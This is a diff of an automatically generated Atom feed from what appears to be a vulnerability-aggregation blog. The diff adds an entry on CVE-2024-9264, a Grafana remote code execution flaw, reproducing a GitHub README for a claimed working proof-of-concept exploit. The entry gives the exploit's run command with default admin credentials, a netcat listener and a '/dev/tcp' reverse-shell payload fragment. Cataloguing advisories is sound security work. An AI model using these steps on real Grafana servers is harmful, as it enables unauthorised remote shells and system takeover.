@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-15T00:45:12.811Z</updated>
+  <updated>2025-06-15T01:15:13.443Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,33 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Grafana 远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/15/github_2873240879/"/>
+    <id>http://example.com/2025/06/15/github_2873240879/</id>
+    <published>2025-06-15T01:15:13.445Z</published>
+    <updated>2025-06-15T01:15:13.443Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Grafana 远程代码执行漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-9264</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> CVE-2024-9264是Grafana中的一个严重远程代码执行漏洞，通过SQL表达式和DuckDB利用。此漏洞允许攻击者在易受攻击的Grafana实例上执行任意代码。修复版本解决了原始PoC中的语法错误和<code>write_file()</code>函数的不正确使用问题，并成功通过<code>shellfs</code>扩展写入和执行反向shell。</p><p><strong>产品厂商：</strong> Grafana</p><p><strong>产品名称：</strong> Grafana</p><p><strong>影响版本：</strong> 11.0.0</p><p><strong>来源：</strong> <a href="https://github.com/Exerrdev/CVE-2024-9264-Fixed">https://github.com/Exerrdev/CVE-2024-9264-Fixed</a></p><p><strong>类型：</strong> CVE-2024:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>README.md</li><li>fpoc.py</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="🛠️-CVE-2024-9264-Fixed-Grafana-RCE-Exploit"><a href="#🛠️-CVE-2024-9264-Fixed-Grafana-RCE-Exploit" class="headerlink" title="🛠️ CVE-2024-9264 - Fixed Grafana RCE Exploit"></a>🛠️ CVE-2024-9264 - Fixed Grafana RCE Exploit</h2><p>This is a <strong>fixed version</strong> of the proof-of-concept exploit for <strong>CVE-2024-9264</strong>, a critical remote code execution vulnerability in Grafana (via SQL expressions and DuckDB).</p><p>🔗 Original advisory: <a href="https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/">Grafana Security Release</a><br>❌ Original PoC: Broken due to syntax errors and incorrect use of <code>write_file()</code><br>✅ This version works, tested on a vulnerable Grafana 11.0.0 instance.</p><hr><h3 id="✅-Fixes-in-this-version"><a href="#✅-Fixes-in-this-version" class="headerlink" title="✅ Fixes in this version"></a>✅ Fixes in this version</h3><ul><li>✅ Correctly uses <code>writefile()</code> instead of <code>write_file()</code> (DuckDB function)</li><li>✅ Proper shell payload using <code>bash -i &gt;&amp; /dev/tcp/...</code></li><li>✅ Reverse shell written and executed successfully via <code>shellfs</code> extension</li></ul><hr><h3 id="📦-Requirements"><a href="#📦-Requirements" class="headerlink" title="📦 Requirements"></a>📦 Requirements</h3><ul><li>Grafana instance with:<ul><li>DuckDB backend</li><li>Ability to <code>install shellfs from community</code></li></ul></li><li>A netcat listener on your attacker machine</li></ul><hr><h3 id="🚀-Usage"><a href="#🚀-Usage" class="headerlink" title="🚀 Usage"></a>🚀 Usage</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 fixed_poc_writefile.py \<br>  --url http://target:3000 \<br>  --username admin \<br>  --password admin \<br>  --reverse-ip &lt;YOUR_IP&gt; \<br>  --reverse-port 4444<br></code></pre></td></tr></table></figure><p>Then listen with:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 4444<br></code></pre></td></tr></table></figure><hr><h3 id="⚠️-Legal-Disclaimer"><a href="#⚠️-Legal-Disclaimer" class="headerlink" title="⚠️ Legal Disclaimer"></a>⚠️ Legal Disclaimer</h3><p>This project is <strong>for educational purposes only</strong>.<br>Do not use it against targets you do not have permission to test.</p><hr><h3 id="✍️-Author-of-this-Fix"><a href="#✍️-Author-of-this-Fix" class="headerlink" title="✍️ Author of this Fix"></a>✍️ Author of this Fix</h3><p>Modified and validated by <a href="https://github.com/Exerrdev">Exerr</a> — original PoC by z3k0sec.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Grafana 远程代码执行漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
+    
+  </entry>
   
   <entry>
     <title>Pulse Connect Secure Bypass LFI y Remote Code Execution Vulnerability</title>
@@ -511,33 +538,6 @@
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 网安独行侠&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/xZXFDE09U2v7yaqzFDzZbg&quot;&gt;https://mp.weixin.qq.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="网安独行侠" scheme="http://example.com/tags/%E7%BD%91%E5%AE%89%E7%8B%AC%E8%A1%8C%E4%BE%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>社工札记：比什么都不做多做一点</title>
-    <link href="http://example.com/2025/06/14/weixin_4260902093/"/>
-    <id>http://example.com/2025/06/14/weixin_4260902093/</id>
-    <published>2025-06-14T14:30:47.764Z</published>
-    <updated>2025-06-14T14:30:47.761Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 网安独行侠</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/z0FRc8RZV_fQCewu7hXyOw">https://mp.weixin.qq.com/s/z0FRc8RZV_fQCewu7hXyOw</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 网安独行侠&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/z0FRc8RZV_fQCewu7hXyOw&quot;&gt;https://mp.weixin.qq.</summary>
       
     
     
